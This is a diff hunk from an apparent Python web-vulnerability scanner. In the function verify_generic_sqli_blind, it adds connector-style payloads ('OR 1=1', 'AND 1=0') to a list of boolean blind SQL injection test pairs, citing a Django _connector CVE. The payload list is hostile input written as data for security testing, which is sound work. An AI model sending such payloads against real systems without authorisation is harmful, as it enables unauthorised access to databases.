@@ -2463,11 +2463,15 @@ def verify_generic_sqli_blind(
         # podemos comparar la respuesta "true" (OR 1=1) con la baseline "false" (OR 1=2).
         # Si la respuesta "true" es notablemente mas grande que la "false", hay inyeccion.
         # Esta tecnica es un ultimo recurso para labs con SQLite + app que devuelve los datos.
+        # Incluye patrones de inyeccion de conector (CVE-2025-64459 Django _connector): cuando el
+        # parametro ES el conector SQL (no un valor), el bypass es el parametro completo 'OR 1=1'.
         if not found:
             _bool_payloads = [
                 (f"{orig_value}' OR '1'='1",  f"{orig_value}' OR '1'='2"),   # string context
                 (f"{orig_value}' OR 1=1-- -",  f"{orig_value}' OR 1=2-- -"), # comment
                 (f"{orig_value} OR 1=1-- -",   f"{orig_value} OR 1=2-- -"),  # numeric
+                ("OR 1=1",                      "AND 1=0"),                   # conector SQL completo
+                ("OR 1=1-- -",                  "AND 1=2-- -"),               # conector con comentario
             ]
             for _true_pl, _false_pl in _bool_payloads:
                 if found:
